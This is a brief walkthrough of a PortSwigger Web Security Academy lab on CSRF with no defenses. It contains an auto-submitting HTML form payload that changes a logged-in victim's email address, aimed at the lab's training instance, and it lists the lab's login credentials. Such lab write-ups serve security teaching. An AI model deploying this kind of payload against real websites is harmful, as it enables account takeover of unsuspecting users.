# CSRF vulnerability with no defenses

## This lab's email change functionality is vulnerable to CSRF.

## To solve the lab, craft some HTML that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address and upload it to your exploit server.

## You can log in to your own account using the following credentials: `wiener:peter`

### HINT:

```html
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

### step 1 inspect email content

copy` /my-account/change-email` from inspect element and cahnge to form

### step2

go to expolit and submit

```html
<html>
  <body>
    <form
      action="https://0a73006e0385ae5f800e3f6700e90031.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
